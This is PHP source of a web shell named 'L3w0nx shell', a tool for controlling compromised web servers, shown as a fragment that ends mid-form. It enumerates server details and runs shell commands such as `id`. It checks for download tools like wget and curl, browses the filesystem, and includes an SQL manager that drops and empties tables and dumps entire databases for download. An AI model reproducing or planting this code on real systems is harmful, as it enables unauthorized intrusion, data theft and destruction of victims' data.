	<meta http-equiv="Content-Type" content="text/html; charset=windows-1251">
	<meta http-equiv="Content-Language" content="en-us"><title>
	<?php echo getenv("HTTP_HOST"); ?> - L3w0nx shell</title>
	<style> 
	<!-- 
	A, a:visited { 
		FONT-WEIGHT: normal; 
		COLOR: #dadada;  
		TEXT-DECORATION: none;
	} 
	A:hover { 
		COLOR: #ffffff; 
		TEXT-DECORATION: underline;
	}
	.skin0{
		position:absolute; 
		width:200px; 
		border:2px solid black; 
		background-color:menu;  
		line-height:20px; 
		cursor:default; 
		visibility:hidden;
	}
	.skin1{
		cursor: default; 
		font: menutext; 
		position: absolute; 
		width: 145px; 
		background-color: menu; 
		border: 1 solid buttonface;
		visibility:hidden; 
		border: 2 outset buttonhighlight;  
		font-size: 10px; 
		color: black;
	}
	.menuitems{
		padding-left:15px; 
		padding-right:10px;
	}
	input,select,option,button{
		background-color: #800000; 
		font-size: 8pt; 
		color: #FFCC66;  
		border: 1 solid #666666;
	}
	textarea,iframe{
		background-color: #800000; 
		font-size: 8pt; 
		color: #FFCC66;  
		border: 1 solid #666666;
	}  
	p {
		MARGIN-TOP: 0px; 
		MARGIN-BOTTOM: 0px; 
		LINE-HEIGHT: 150%
	}
	blockquote{ 
		font-size: 8pt;  
		border : 8px solid #A9A9A9; 
		padding: 1em; 
		margin-top: 1em; 
		margin-bottom: 5em; 
		margin-right: 3em; 
		margin-left: 4em; 
		background-color: #B7B2B0;
	}
	body,td,th { 
		font-family: verdana; 
		font-size: 10px;	
		color:#ffffff;
		background-color:#000000; 
		}
	h1,h2,h3,h4,h5,h6{font-family: Courier New;}
.style1 {color: #FF0000}
	-->
	</style>

	</head>
	<BODY ><center>
		<TABLE style="BORDER-COLLAPSE: collapse" cellSpacing=0 cellPadding=15 width= 95%  border=1 >
		<tr><th width="127" height="95" nowrap valign="top" colspan="2"> 
<a href="<?php echo $surl; ?>"><img src="http://a8.sphotos.ak.fbcdn.net/hphotos-ak-snc6/189255_261820743834639_100000201471182_1272289_4972779_n.jpg" width="500" height="120"></a> 
	</th>
	</tr>
	<tr><td>
	<? echo date ("d-m-Y H:i:s")." "; ?> <br>
	<? 

	$curl_on = @function_exists('curl_version'); 
	$mysql_on = @function_exists('mysql_connect');
	$mssql_on = @function_exists('mssql_connect');
	$pg_on = @function_exists('pg_connect');
	$ora_on = @function_exists('ocilogon');
	$df = @ini_get('disable_functions');
	echo "Safe-mode : ". $hsafemode ." | "; 
	echo "cURL       : ".(($curl_on)?("<font color=#00ff00>ON</font> | "):("<font color=#ff0000>OFF</font> | ")); 
	echo "MySQL      : ".(($mysql_on)?("<font color=#00ff00>ON</font> | "):("<font color=#ff0000>OFF</font> | "));
	echo "MSSQL      : ".(($mssql_on)?("<font color=#00ff00>ON</font> | "):("<font color=#ff0000>OFF</font> | "));
	echo "PostgreSQL : ".(($pg_on)?("<font color=#00ff00>ON</font> | "):("<font color=#ff0000>OFF</font> | "));
	echo "Oracle     : ".(($ora_on)?("<font color=#00ff00>ON</font> | "):("<font color=#ff0000>OFF</font><br>")); 
	 
	?>
	<br><table cellpadding=0 cellspacing=0>
	<tr><td>Disable functions </td><td> : <? if(''==($df=@ini_get('disable_functions'))){echo "<font color=#00ff00>NONE</font></b>";}else{echo "<font color=#ff0000>$df</font></b>";} ?>
	<tr><td>Software</td><td> : <font color=#00ff00><?php echo $DISP_SERVER_SOFTWARE; ?></font></td></tr> 
	<tr><td>Nama Sistem</td><td> : <font color=#00ff00><?php echo wordwrap(php_uname(),90,"<br>",1); ?></font></td></tr>  
	<tr><td>User</td><td> : <font color=#00ff00>
	<?php if (!$win) {echo wordwrap(myshellexec("id"),90,"<br>",1);} 
	else {echo get_current_user();} ?></font> </td></tr> 
	<tr><td>Methode </td><td> : <font color=#00ff00>
	<?php
	function asdads() 
	{
		$asdads = '';
		if (@file_exists("/usr/bin/wget")) { $asdads .= "wget "; }
		if (@file_exists("/usr/bin/fetch")) { $asdads .= "fetch "; }
		if (@file_exists("/usr/bin/curl")) { $asdads .= "curl "; }
		if (@file_exists("/usr/bin/GET")) { $asdads .= "GET "; }
		if (@file_exists("/usr/bin/lynx")) { $asdads .= "lynx "; }
		return $asdads;
	}
		
	$Methods = asdads();
  if ($Methods == '') { $Methods = "???"; }
	echo $Methods
	?>	
	</font> </td></tr></table><br> 
	<?php
	$d = str_replace("\\",DIRECTORY_SEPARATOR,$d);
	if (empty($d)) {$d = realpath(".");} elseif(realpath($d)) {$d = realpath($d);}
	$d = str_replace("\\",DIRECTORY_SEPARATOR,$d);
	if (substr($d,-1) != DIRECTORY_SEPARATOR) {$d .= DIRECTORY_SEPARATOR;}
	$d = str_replace("\\\\","\\",$d);
	$dispd = htmlspecialchars($d);
	$pd = $e = explode(DIRECTORY_SEPARATOR,substr($d,0,-1));
	$i = 0;
	foreach($pd as $b)
	{
		$t = "";
		$j = 0;
		foreach ($e as $r)
		{
			$t.= $r.DIRECTORY_SEPARATOR;
			if ($j == $i) {break;}
			$j++;
		}
		echo "<a href=\"".$surl."act=ls&d=".urlencode($t)."&sort=".$sort."\">".htmlspecialchars($b).DIRECTORY_SEPARATOR."</a>";
		$i++;
	} 
	if (is_writable($d))
	{
		$wd = TRUE;
		$wdt = "<font color=#00ff00>[ ok ]</font>";
		echo " <font color=#00ff00>".view_perms(fileperms($d))."</font></b>";
	}
	else
	{
		$wd = FALSE;
		$wdt = "<font color=#ff0000>[ Read-Only ]</font>";
		echo " ".view_perms_color($d)."";
	}
	if (is_callable("disk_free_space"))
	{
		$free = disk_free_space($d);
		$total = disk_total_space($d);
		if ($free === FALSE) {$free = 0;}
		if ($total === FALSE) {$total = 0;}
		if ($free < 0) {$free = 0;}
		if ($total < 0) {$total = 0;}
		$used = $total-$free;
		$free_percent = round(100/($total/$free),2);
		echo "<br>Free <font color=#00ff00>".view_size($free)."</font> of ".view_size($total)." (".$free_percent."%) ";
	}
	echo "<br>";
	$letters = "";
	if ($win)
	{
		$v = explode("\\",$d);
		$v = $v[0];
		foreach (range("a","z") as $letter)
		{
		  $bool = $isdiskette = in_array($letter,$safemode_diskettes);
		  if (!$bool) {$bool = is_dir($letter.":\\");}
		  if ($bool)
		  {
				$letters .= "<a href=\"".$surl."act=ls&d=".urlencode($letter.":\\")."\"".($isdiskette?" onclick=\"return confirm('Hari gini... masih pake disket?')\"":"").">[ ";
				if ($letter.":" != $v) {$letters .= $letter;}
				else {$letters .= "<font color=#00ff00>".$letter."</font>";}
				$letters .= " ]</a> ";
		  }
		}
		if (!empty($letters)) {echo "Drive :  ". $letters ."";}
	}
	if (count($quicklaunch) > 0)
	{
		echo "<center> <hr>";
		foreach($quicklaunch as $item)
		{
			$item[1] = str_replace("%d",urlencode($d),$item[1]);
			$item[1] = str_replace("%sort",$sort,$item[1]);
			$v = realpath($d."..");
			if (empty($v)) 
			{
				$a = explode(DIRECTORY_SEPARATOR,$d); 
				unset($a[count($a)-2]); $v = join(DIRECTORY_SEPARATOR,$a);
			}
			$item[1] = str_replace("%upd",urlencode($v),$item[1]);
			echo "[<a href=\"".$item[1]."\"><b>".$item[0]."</b></a>] ";
		}
	}
	echo "</center>";
	echo "</td></tr></table><br>";
	if ((!empty($donated_html)) and (in_array($act,$donated_act))) 
	{echo "<TABLE style=\"BORDER-COLLAPSE: collapse\" cellPadding=5 width=95% border=1><tr>
	<td width=100% valign=top>".$donated_html."</td></tr></table><br>";}
	echo "<TABLE style=\"BORDER-COLLAPSE: collapse\" cellPadding=5 width=95%  border=1>
	<tr><td width=100% valign=top>";
	if ($act == "") {$act = $dspact = "ls";}

	#################### SQL #######################

	if ($act == "sql")
	{
		$sql_surl = $surl."act=sql";
		if ($sql_login)  {$sql_surl .= "&sql_login=".htmlspecialchars($sql_login);}
		if ($sql_passwd) {$sql_surl .= "&sql_passwd=".htmlspecialchars($sql_passwd);}
		if ($sql_server) {$sql_surl .= "&sql_server=".htmlspecialchars($sql_server);}
		if ($sql_port)   {$sql_surl .= "&sql_port=".htmlspecialchars($sql_port);}
		if ($sql_db)     {$sql_surl .= "&sql_db=".htmlspecialchars($sql_db);}
		$sql_surl .= "&";
		?>
	 
		<h3>Attention! SQL-Manager is <u>NOT</u> ready module! Don't reports bugs.</h3>
	 
		<TABLE style="BORDER-COLLAPSE: collapse" height=1 cellSpacing=0  cellPadding=5 width="100%"   border=1 bordercolor="#C0C0C0"><tr><td width="100%" height="1" colspan="2" valign="top"><center><?php
		if ($sql_server)
		{
			$sql_sock = mysql_connect($sql_server.":".$sql_port, $sql_login, $sql_passwd);
			$err = mysql_smarterror();
			@mysql_select_db($sql_db,$sql_sock);
			if ($sql_query and $submit) {$sql_query_result = mysql_query($sql_query,$sql_sock); $sql_query_error = mysql_smarterror();}
		}
		else {$sql_sock = FALSE;}
		echo "<b>SQL Manager:</b><br>";
		if (!$sql_sock)
		{
			if (!$sql_server) {echo "NO CONNECTION";}
			else {echo "<center><b>Can't connect</b></center>"; echo "<b>".$err."</b>";}
		}
		else
		{
			$sqlquicklaunch = array();
			$sqlquicklaunch[] = array("Index",$surl."act=sql&sql_login=".htmlspecialchars($sql_login)."&sql_passwd=".htmlspecialchars($sql_passwd)."&sql_server=".htmlspecialchars($sql_server)."&sql_port=".htmlspecialchars($sql_port)."&");
			$sqlquicklaunch[] = array("Query",$sql_surl."sql_act=query&sql_tbl=".urlencode($sql_tbl));
			$sqlquicklaunch[] = array("Server-status",$surl."act=sql&sql_login=".htmlspecialchars($sql_login)."&sql_passwd=".htmlspecialchars($sql_passwd)."&sql_server=".htmlspecialchars($sql_server)."&sql_port=".htmlspecialchars($sql_port)."&sql_act=serverstatus");
			$sqlquicklaunch[] = array("Server variables",$surl."act=sql&sql_login=".htmlspecialchars($sql_login)."&sql_passwd=".htmlspecialchars($sql_passwd)."&sql_server=".htmlspecialchars($sql_server)."&sql_port=".htmlspecialchars($sql_port)."&sql_act=servervars");
			$sqlquicklaunch[] = array("Processes",$surl."act=sql&sql_login=".htmlspecialchars($sql_login)."&sql_passwd=".htmlspecialchars($sql_passwd)."&sql_server=".htmlspecialchars($sql_server)."&sql_port=".htmlspecialchars($sql_port)."&sql_act=processes");
			$sqlquicklaunch[] = array("Logout",$surl."act=sql");
			echo "<center><b>MySQL ".mysql_get_server_info()." (proto v.".mysql_get_proto_info ().") running in ".htmlspecialchars($sql_server).":".htmlspecialchars($sql_port)." as ".htmlspecialchars($sql_login)."@".htmlspecialchars($sql_server)." (password - \"".htmlspecialchars($sql_passwd)."\")</b><br>";
			if (count($sqlquicklaunch) > 0) {foreach($sqlquicklaunch as $item) {echo "[ <a href=\"".$item[1]."\"><b>".$item[0]."</b></a> ] ";}}
			echo "</center>";
		}
		echo "</td></tr><tr>";
		if (!$sql_sock) 
		{
			?>
			<td width="28%" height="100" valign="top"><center><font size="5"> i </font></center>
			<li>If login is null, login is owner of process.<li>If host is null, host is localhost</b>
			<li>If port is null, port is 3306 (default)</td><td width="90%" height="1" valign="top">
			<TABLE height=1 cellSpacing=0 cellPadding=0 width="100%" border=0><tr>
			<td> <b>Please, fill the form:</b><table><tr><td><b>Username</b></td><td><b>Password</b> </td>
			<td><b>Database</b> </td></tr><form action="<?php echo $surl; ?>" method="POST">
			<input type="hidden" name="act" value="sql"><tr><td>
			<input type="text" name="sql_login" value="root" maxlength="64"></td><td>
			<input type="password" name="sql_passwd" value="" maxlength="64"></td><td>
			<input type="text" name="sql_db" value="" maxlength="64"></td></tr>
			<tr><td><b>Host</b></td><td><b>PORT</b></td></tr><tr><td align=right>
			<input type="text" name="sql_server" value="localhost" maxlength="64"></td>
			<td><input type="text" name="sql_port" value="3306" maxlength="6" size="3"></td>
			<td><input type="submit" value="Connect"></td></tr><tr><td></td></tr></form></table></td>
			<?php 
		}
		else
		{
			//Start left panel
			if (!empty($sql_db))
			{
				?><td width="25%" height="100%" valign="top"><a href="<?php echo $surl."ircbot/act=sql&sql_login=".htmlspecialchars($sql_login)."&sql_passwd=".htmlspecialchars($sql_passwd)."&sql_server=".htmlspecialchars($sql_server)."&sql_port=".htmlspecialchars($sql_port)."&"; ?>"><b>Home</b></a><hr size="1" noshade><?php
				$result = mysql_list_tables($sql_db);
				if (!$result) {echo mysql_smarterror();}
				else
				{
					echo "---[ <a href=\"".$sql_surl."&\"><b>".htmlspecialchars($sql_db)."</b></a> ]---<br>";
					$c = 0;
					while ($row = mysql_fetch_array($result)) {$count = mysql_query ("SELECT COUNT(*) FROM ".$row[0]); $count_row = mysql_fetch_array($count); echo "<b>? <a href=\"".$sql_surl."sql_db=".htmlspecialchars($sql_db)."&sql_tbl=".htmlspecialchars($row[0])."\"><b>".htmlspecialchars($row[0])."</b></a> (".$count_row[0].")</br></b>"; mysql_free_result($count); $c++;}
					if (!$c) {echo "No tables found in database.";}
				}
			}
			else
			{
				?><td width="1" height="100" valign="top"><a href="<?php echo $sql_surl; ?>"><b>Home</b></a><hr size="1" noshade><?php
				$result = mysql_list_dbs($sql_sock);
				if (!$result) {echo mysql_smarterror();}
				else
				{
					?>
					<form action="<?php echo $surl; ?>">
					<input type="hidden" name="act" value="sql">
					<input type="hidden" name="sql_login" value="<?php echo htmlspecialchars($sql_login); ?>">
					<input type="hidden" name="sql_passwd" value="<?php echo htmlspecialchars($sql_passwd); ?>">
					<input type="hidden" name="sql_server" value="<?php echo htmlspecialchars($sql_server); ?>">
					<input type="hidden" name="sql_port" value="<?php echo htmlspecialchars($sql_port); ?>">
					<select name="sql_db">
					<?php
					$c = 0;
					$dbs = "";
					while ($row = mysql_fetch_row($result)) {$dbs .= "<option value=\"".$row[0]."\""; if ($sql_db == $row[0]) {$dbs .= " selected";} $dbs .= ">".$row[0]."</option>"; $c++;}
					echo "<option value=\"\">Databases (".$c.")</option>";
					echo $dbs;
				}
		   ?></select><hr size="1" noshade>Please, select database<hr size="1" noshade><input type="submit" value="Go"></form><?php
			}
			//End left panel
			echo "</td><td width=\"100%\" height=\"1\" valign=\"top\">";
			//Start center panel
			$diplay = TRUE;
			if ($sql_db)
		  {
				if (!is_numeric($c)) {$c = 0;}
				if ($c == 0) {$c = "no";}
				echo "<hr size=\"1\" noshade><center><b>There are ".$c." table(s) in this DB (".htmlspecialchars($sql_db).").<br>";
				if (count($dbquicklaunch) > 0) {foreach($dbsqlquicklaunch as $item) {echo "[ <a href=\"".$item[1]."\">".$item[0]."</a> ] ";}}
				echo "</b></center>";
				$acts = array("","dump");
				if ($sql_act == "tbldrop") {$sql_query = "DROP TABLE"; foreach($boxtbl as $v) {$sql_query .= "\n`".$v."` ,";} $sql_query = substr($sql_query,0,-1).";"; $sql_act = "query";}
				elseif ($sql_act == "tblempty") {$sql_query = ""; foreach($boxtbl as $v) {$sql_query .= "DELETE FROM `".$v."` \n";} $sql_act = "query";}
				elseif ($sql_act == "tbldump") {if (count($boxtbl) > 0) {$dmptbls = $boxtbl;} elseif($thistbl) {$dmptbls = array($sql_tbl);} $sql_act = "dump";}
				elseif ($sql_act == "tblcheck") {$sql_query = "CHECK TABLE"; foreach($boxtbl as $v) {$sql_query .= "\n`".$v."` ,";} $sql_query = substr($sql_query,0,-1).";"; $sql_act = "query";}
				elseif ($sql_act == "tbloptimize") {$sql_query = "OPTIMIZE TABLE"; foreach($boxtbl as $v) {$sql_query .= "\n`".$v."` ,";} $sql_query = substr($sql_query,0,-1).";"; $sql_act = "query";}
				elseif ($sql_act == "tblrepair") {$sql_query = "REPAIR TABLE"; foreach($boxtbl as $v) {$sql_query .= "\n`".$v."` ,";} $sql_query = substr($sql_query,0,-1).";"; $sql_act = "query";}
				elseif ($sql_act == "tblanalyze") {$sql_query = "ANALYZE TABLE"; foreach($boxtbl as $v) {$sql_query .= "\n`".$v."` ,";} $sql_query = substr($sql_query,0,-1).";"; $sql_act = "query";}
				elseif ($sql_act == "deleterow") {$sql_query = ""; 
				if (!empty($boxrow_all)) {$sql_query = "DELETE * FROM `".$sql_tbl."`;";} 
				else {
					foreach($boxrow as $v) 
					{
						$sql_query .= "DELETE * FROM `".$sql_tbl."` WHERE".$v." LIMIT 1;\n";
					} 
					$sql_query = substr($sql_query,0,-1);} $sql_act = "query";}
				elseif ($sql_tbl_act == "insert")
				{
					if ($sql_tbl_insert_radio == 1)
			    {
						$keys = "";
						$akeys = array_keys($sql_tbl_insert);
						foreach ($akeys as $v) {$keys .= "`".addslashes($v)."`, ";}
						if (!empty($keys)) {$keys = substr($keys,0,strlen($keys)-2);}
						$values = "";
						$i = 0;
						foreach (array_values($sql_tbl_insert) as $v) 
						{
							if ($funct = $sql_tbl_insert_functs[$akeys[$i]]) {$values .= $funct." (";} 
							$values .= "'".addslashes($v)."'"; if ($funct) {$values .= ")";} $values .= ", "; $i++;
						}
						if (!empty($values)) {$values = substr($values,0,strlen($values)-2);}
						$sql_query = "INSERT INTO `".$sql_tbl."` ( ".$keys." ) VALUES ( ".$values." );";
						$sql_act = "query";
						$sql_tbl_act = "browse";
					}
					elseif ($sql_tbl_insert_radio == 2)
					{
						$set = mysql_buildwhere($sql_tbl_insert,", ",$sql_tbl_insert_functs);
						$sql_query = "UPDATE `".$sql_tbl."` SET ".$set." WHERE ".$sql_tbl_insert_q." LIMIT 1;";
						$result = mysql_query($sql_query) or print(mysql_smarterror());
						$result = mysql_fetch_array($result, MYSQL_ASSOC);
						$sql_act = "query";
						$sql_tbl_act = "browse";
					}
				}
				if ($sql_act == "query")
				{
					echo "<hr size=\"1\" noshade>";
					if (($submit) and (!$sql_query_result) and ($sql_confirm)) 
					{
						if (!$sql_query_error) {$sql_query_error = "Query was empty";} 
						echo "<b>Error:</b> <br>".$sql_query_error."<br>";
					}
					if ($sql_query_result or (!$sql_confirm)) {$sql_act = $sql_goto;}
					if ((!$submit) or ($sql_act)) 
					{
						echo "<table border=\"0\" width=\"100%\" height=\"1\"><tr>
						<td><form action=\"".$sql_surl."\" method=\"POST\"><b>"; 
						if (($sql_query) and (!$submit)) {echo "Do you really want to:";} 
						else {echo "SQL-Query :";} 
						echo "</b><br><br><textarea name=\"sql_query\" cols=\"100\" rows=\"10\">".htmlspecialchars($sql_query)."</textarea><br><br>
						<input type=\"hidden\" name=\"sql_act\" value=\"query\">
						<input type=\"hidden\" name=\"sql_tbl\" value=\"".htmlspecialchars($sql_tbl)."\">
						<input type=\"hidden\" name=\"submit\" value=\"1\">
						<input type=\"hidden\" name=\"sql_goto\" value=\"".htmlspecialchars($sql_goto)."\">
						<input type=\"submit\" name=\"sql_confirm\" value=\"Yes\"> 
						<input type=\"submit\" value=\"No\"></form></td></tr></table>";
					}
				}
				if (in_array($sql_act,$acts))
				{
					?>
					<table border="0" width="100%" height="1"><tr>
					<td width="30%" height="1"><b>Create new table:</b>
					<form action="<?php echo $surl; ?>"><input type="hidden" name="act" value="sql">
					<input type="hidden" name="sql_act" value="newtbl">
					<input type="hidden" name="sql_db" value="<?php echo htmlspecialchars($sql_db); ?>">
					<input type="hidden" name="sql_login" value="<?php echo htmlspecialchars($sql_login); ?>">
					<input type="hidden" name="sql_passwd" value="<?php echo htmlspecialchars($sql_passwd); ?>">
					<input type="hidden" name="sql_server" value="<?php echo htmlspecialchars($sql_server); ?>">
					<input type="hidden" name="sql_port" value="<?php echo htmlspecialchars($sql_port); ?>">
					<input type="text" name="sql_newtbl" size="20"> <input type="submit" value="Create"></form></td>
					<td width="30%" height="1"><b>Dump DB:</b><form action="<?php echo $surl; ?>">
					<input type="hidden" name="act" value="sql">
					<input type="hidden" name="sql_act" value="dump">
					<input type="hidden" name="sql_db" value="<?php echo htmlspecialchars($sql_db); ?>">
					<input type="hidden" name="sql_login" value="<?php echo htmlspecialchars($sql_login); ?>">
					<input type="hidden" name="sql_passwd" value="<?php echo htmlspecialchars($sql_passwd); ?>">
					<input type="hidden" name="sql_server" value="<?php echo htmlspecialchars($sql_server); ?>">
					<input type="hidden" name="sql_port" value="<?php echo htmlspecialchars($sql_port); ?>">
					<input type="text" name="dump_file" size="30" value="<?php echo "dump_".getenv("SERVER_NAME")."_".$sql_db."_".date("d-m-Y-H-i-s").".sql"; ?>"> 
					<input type="submit" name=\"submit\" value="Dump"></form></td><td width="30%" height="1"></td></tr>
					<tr><td width="30%" height="1"></td><td width="30%" height="1"></td><td width="30%" height="1"></td></tr>
					</table>
					<?php
					if (!empty($sql_act)) {echo "<hr size=\"1\" noshade>";}
					if ($sql_act == "newtbl")
					{
						echo "<b>";
						if ((mysql_create_db ($sql_newdb)) and (!empty($sql_newdb))) 
						{
							echo "DB \"".htmlspecialchars($sql_newdb)."\" has been created with success!</b><br>";
						}
						else {echo "Can't create DB \"".htmlspecialchars($sql_newdb)."\".<br>Reason:</b> ".mysql_smarterror();}
					}
					elseif ($sql_act == "dump")
					{
						if (empty($submit))
						{
							$diplay = FALSE;
							echo "<form method=\"GET\"><input type=\"hidden\" name=\"act\" value=\"sql\">
							<input type=\"hidden\" name=\"sql_act\" value=\"dump\">
							<input type=\"hidden\" name=\"sql_db\" value=\"".htmlspecialchars($sql_db)."\">
							<input type=\"hidden\" name=\"sql_login\" value=\"".htmlspecialchars($sql_login)."\">
							<input type=\"hidden\" name=\"sql_passwd\" value=\"".htmlspecialchars($sql_passwd)."\">
							<input type=\"hidden\" name=\"sql_server\" value=\"".htmlspecialchars($sql_server)."\">
							<input type=\"hidden\" name=\"sql_port\" value=\"".htmlspecialchars($sql_port)."\">
							<input type=\"hidden\" name=\"sql_tbl\" value=\"".htmlspecialchars($sql_tbl)."\">
							<b>SQL-Dump:</b><br><br>";
							echo "<b>DB:</b> <input type=\"text\" name=\"sql_db\" value=\"".urlencode($sql_db)."\"><br><br>";
							$v = join (";",$dmptbls);
							echo "<b>Only tables (explode \";\") <b><sup>1</sup></b>:</b> 
							<input type=\"text\" name=\"dmptbls\" value=\"".htmlspecialchars($v)."\" size=\"".(strlen($v)+5)."\"><br><br>";
							if ($dump_file) {$tmp = $dump_file;}
							else {$tmp = htmlspecialchars("./dump_".getenv("SERVER_NAME")."_".$sql_db."_".date("d-m-Y-H-i-s").".sql");}
							echo "<b>File:</b> <input type=\"text\" name=\"sql_dump_file\" value=\"".$tmp."\" size=\"".(strlen($tmp)+strlen($tmp) % 30)."\"><br><br>";
							echo "<b>Download: </b> <input type=\"checkbox\" name=\"sql_dump_download\" value=\"1\" checked><br><br>";
							echo "<b>Save to file: </b> <input type=\"checkbox\" name=\"sql_dump_savetofile\" value=\"1\" checked>";
							echo "<br><br><input type=\"submit\" name=\"submit\" value=\"Dump\"><br><br><b><sup>1</sup></b> - all, if empty";
							echo "</form>";
						}
						else
						{
							$diplay = TRUE;
							$set = array();
							$set["sock"] = $sql_sock;
							$set["db"] = $sql_db;
							$dump_out = "download";
							$set["print"] = 0;
							$set["nl2br"] = 0;
							$set[""] = 0;
							$set["file"] = $dump_file;
							$set["add_drop"] = TRUE;
							$set["onlytabs"] = array();
							if (!empty($dmptbls)) {$set["onlytabs"] = explode(";",$dmptbls);}
							$ret = mysql_dump($set);
							if ($sql_dump_download)
							{
								@ob_clean();
								header("Content-type: application/octet-stream");
								header("Content-length: ".strlen($ret));
								header("Content-disposition: attachment; filename=\"".basename($sql_dump_file)."\";");
								echo $ret;
								exit;
							}
							elseif ($sql_dump_savetofile)
							{
								$fp = fopen($sql_dump_file,"w");
								if (!$fp) {echo "<b>Dump error! Can't write to \"".htmlspecialchars($sql_dump_file)."\"!";}
								else
								{
									fwrite($fp,$ret);
									fclose($fp);
									echo "<b>Dumped! Dump has been writed to \"".htmlspecialchars(realpath($sql_dump_file))."\" (".view_size(filesize($sql_dump_file)).")</b>.";
								}
							}
							else {echo "<b>Dump: nothing to do!</b>";}
						}
					}
					if ($diplay)
					{
				    if (!empty($sql_tbl))
						{
							if (empty($sql_tbl_act)) {$sql_tbl_act = "browse";}
							$count = mysql_query("SELECT COUNT(*) FROM `".$sql_tbl."`;");
							$count_row = mysql_fetch_array($count);
							mysql_free_result($count);
							$tbl_struct_result = mysql_query("SHOW FIELDS FROM `".$sql_tbl."`;");
							$tbl_struct_fields = array();
							while ($row = mysql_fetch_assoc($tbl_struct_result)) {$tbl_struct_fields[] = $row;}
							if ($sql_ls > $sql_le) {$sql_le = $sql_ls + $perpage;}
							if (empty($sql_tbl_page)) {$sql_tbl_page = 0;}
							if (empty($sql_tbl_ls)) {$sql_tbl_ls = 0;}
							if (empty($sql_tbl_le)) {$sql_tbl_le = 30;}
							$perpage = $sql_tbl_le - $sql_tbl_ls;
							if (!is_numeric($perpage)) {$perpage = 10;}
							$numpages = $count_row[0]/$perpage;
							$e = explode(" ",$sql_order);
							if (count($e) == 2)
							{
								if ($e[0] == "d") {$asc_desc = "DESC";}
								else {$asc_desc = "ASC";}
								$v = "ORDER BY `".$e[1]."` ".$asc_desc." ";
							}
							else {$v = "";}
							$query = "SELECT * FROM `".$sql_tbl."` ".$v."LIMIT ".$sql_tbl_ls." , ".$perpage."";
							$result = mysql_query($query) or print(mysql_smarterror());
							echo "<hr size=\"1\" noshade><center><b>Table ".htmlspecialchars($sql_tbl)." (".mysql_num_fields($result)." cols and ".$count_row[0]." rows)</b></center>";
							echo "<a href=\"".$sql_surl."sql_tbl=".urlencode($sql_tbl)."&sql_tbl_act=structure\">[ <b>Structure</b> ]</a> ";
							echo "<a href=\"".$sql_surl."sql_tbl=".urlencode($sql_tbl)."&sql_tbl_act=browse\">[ <b>Browse</b> ]</a> ";
							echo "<a href=\"".$sql_surl."sql_tbl=".urlencode($sql_tbl)."&sql_act=tbldump&thistbl=1\">[ <b>Dump</b> ]</a> ";
							echo "<a href=\"".$sql_surl."sql_tbl=".urlencode($sql_tbl)."&sql_tbl_act=insert\">[ <b>Insert</b> ]</a> ";
							if ($sql_tbl_act == "structure") {echo "<br><br><b>Coming sooon!</b>";}
							if ($sql_tbl_act == "insert")
							{
								if (!is_array($sql_tbl_insert)) {$sql_tbl_insert = array();}
								if (!empty($sql_tbl_insert_radio)){}								 
								else
								{
									echo "<br><br><b>Inserting row into table:</b><br>";
									if (!empty($sql_tbl_insert_q))
									{
										$sql_query = "SELECT * FROM `".$sql_tbl."`";
										$sql_query .= " WHERE".$sql_tbl_insert_q;
										$sql_query .= " LIMIT 1;";
										$result = mysql_query($sql_query,$sql_sock) or print("<br><br>".mysql_smarterror());
										$values = mysql_fetch_assoc($result);
										mysql_free_result($result);
									}
									else {$values = array();}
									echo "<form method=\"POST\"><TABLE cellSpacing=0  cellPadding=5 width=\"1%\"   border=1>
									<tr><td><b>Field</b></td><td><b>Type</b></td><td><b>Function</b></td><td><b>Value</b></td></tr>";
									foreach ($tbl_struct_fields as $field)
									{
										$name = $field["Field"];
										if (empty($sql_tbl_insert_q)) {$v = "";}
										echo "<tr><td><b>".htmlspecialchars($name)."</b></td><td>".$field["Type"]."</td>
										<td><select name=\"sql_tbl_insert_functs[".htmlspecialchars($name)."]\"><option value=\"\"></option>
										<option>PASSWORD</option><option>MD5</option><option>ENCRYPT</option>
										<option>ASCII</option><option>CHAR</option><option>RAND</option>
										<option>LAST_INSERT_ID</option><option>COUNT</option><option>AVG</option>
										<option>SUM</option><option value=\"\">--------</option><option>SOUNDEX</option>
										<option>LCASE</option><option>UCASE</option><option>NOW</option><option>CURDATE</option>
										<option>CURTIME</option><option>FROM_DAYS</option><option>FROM_UNIXTIME</option>
										<option>PERIOD_ADD</option><option>PERIOD_DIFF</option><option>TO_DAYS</option>
										<option>UNIX_TIMESTAMP</option><option>USER</option><option>WEEKDAY</option>
										<option>CONCAT</option></select></td><td>
										<input type=\"text\" name=\"sql_tbl_insert[".htmlspecialchars($name)."]\" value=\"".htmlspecialchars($values[$name])."\" size=50></td></tr>";
										$i++;
									}
									echo "</table><br>";
									echo "<input type=\"radio\" name=\"sql_tbl_insert_radio\" value=\"1\""; if (empty($sql_tbl_insert_q)) {echo " checked";} echo "><b>Insert as new row</b>";
									if (!empty($sql_tbl_insert_q)) {echo " or <input type=\"radio\" name=\"sql_tbl_insert_radio\" value=\"2\" checked><b>Save</b>"; 
									echo "<input type=\"hidden\" name=\"sql_tbl_insert_q\" value=\"".htmlspecialchars($sql_tbl_insert_q)."\">";}
									echo "<br><br><input type=\"submit\" value=\"Confirm\"></form>";
								}
							}
							if ($sql_tbl_act == "browse")
							{	
								$sql_tbl_ls = abs($sql_tbl_ls);
								$sql_tbl_le = abs($sql_tbl_le);
								echo "<hr size=\"1\" noshade>";
								echo "Pages ";
								$b = 0;
								for($i=0;$i<$numpages;$i++)
								{
									if (($i*$perpage != $sql_tbl_ls) or ($i*$perpage+$perpage != $sql_tbl_le)) 
									{
										echo "<a href=\"".$sql_surl."sql_tbl=".urlencode($sql_tbl)."&sql_order=".htmlspecialchars($sql_order)."&sql_tbl_ls=".($i*$perpage)."&sql_tbl_le=".($i*$perpage+$perpage)."\"><u>";
									}
									echo $i;
									if (($i*$perpage != $sql_tbl_ls) or ($i*$perpage+$perpage != $sql_tbl_le)) {echo "</u></a>";}
									if (($i/30 == round($i/30)) and ($i > 0)) {echo "<br>";}
									else {echo " ";}
								}
								if ($i == 0) {echo "empty";}
								echo "<form method=\"GET\"><input type=\"hidden\" name=\"act\" value=\"sql\">
								<input type=\"hidden\" name=\"sql_db\" value=\"".htmlspecialchars($sql_db)."\">
								<input type=\"hidden\" name=\"sql_login\" value=\"".htmlspecialchars($sql_login)."\">
								<input type=\"hidden\" name=\"sql_passwd\" value=\"".htmlspecialchars($sql_passwd)."\">
								<input type=\"hidden\" name=\"sql_server\" value=\"".htmlspecialchars($sql_server)."\">
								<input type=\"hidden\" name=\"sql_port\" value=\"".htmlspecialchars($sql_port)."\">
								<input type=\"hidden\" name=\"sql_tbl\" value=\"".htmlspecialchars($sql_tbl)."\">
